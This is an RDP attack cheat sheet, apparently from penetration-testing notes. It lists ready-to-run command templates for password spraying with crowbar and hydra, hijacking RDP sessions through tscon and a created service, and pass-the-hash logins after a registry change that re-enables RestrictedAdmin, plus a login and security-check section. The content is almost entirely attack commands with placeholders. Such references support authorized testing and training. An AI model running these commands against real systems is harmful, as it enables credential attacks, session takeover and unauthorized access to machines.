###### Password Spraying
```
crowbar -b rdp -s <IP/CIDR> -U <USER_LIST> -c '<PASS>'
hydra -L <USER_LIST> -p '<PASS>' <IP> rdp
```
###### Login
```
rdesktop -u <USER> -p <PASS> <IP>
xfreerdp /u:<USER> /p:'<PASS>' /w:1200 /h:1200 /drive:my_drive,/tmp /v:<IP>
```
###### Session Hijacking
```
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```
###### PTH
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:<IP> /u:<USER> /pth:<HASH>
```
###### Security Checking
```
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl <IP>
```